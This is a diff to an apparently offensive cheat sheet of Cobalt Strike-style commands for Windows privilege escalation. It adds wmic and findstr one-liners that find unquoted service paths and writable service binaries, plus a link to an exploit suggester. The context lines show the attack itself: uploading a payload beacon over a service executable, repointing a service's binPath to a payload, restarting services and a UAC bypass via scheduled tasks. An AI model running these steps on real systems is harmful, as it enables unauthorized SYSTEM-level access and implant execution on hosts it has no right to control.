@@ -10,6 +10,7 @@ execute-assembly /root/SharpUp.exe audit ModifiableServiceBinaries
 ### Unquoted Service Paths
 ```
 run wmic service get name,pathname
+run wmic service get name,displayname,startmode,pathname | findstr /i /v "c:\windows" | findstr /i "c:"
 powershell Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl
 upload C:\Payloads\tcp-local_x64.svc.exe "C:\Program Files\Vulnerable Services\Service.exe"
 run sc stop VulnService1
@@ -30,6 +31,7 @@ run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe
 ### Weak Service Binary Permissions
 ```
 powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl
+run wmic service get pathname | findstr /i /v "c:\windows" | findstr /i "c:" | % { $_.split('"')[1] } | % { get-acl $_ } | fl -Property path,AccessToString | findstr /i "path modify write fullcontrol"
 run sc stop VulnService3
 upload C:\Payloads\tcp-local_x64.svc.exe "C:\Program Files\Vulnerable Services\Service 3.exe"
 run sc start VulnService3
@@ -43,8 +45,10 @@ elevate uac-schtasks tcp-local
 ```
 
 ### Local Exploit Suggester
+https://github.com/AonCyberLabs/Windows-Exploit-Suggester
 ```
 systeminfo > system.info
 pip2 install xlrd==1.1.0
-./windows-exploit-suggester.py -d 2023-01-21-mssb.xls -i system.info
+python windows-exploit-suggester.py --update
+python windows-exploit-suggester.py -d 2023-01-21-mssb.xls -i system.info
 ```
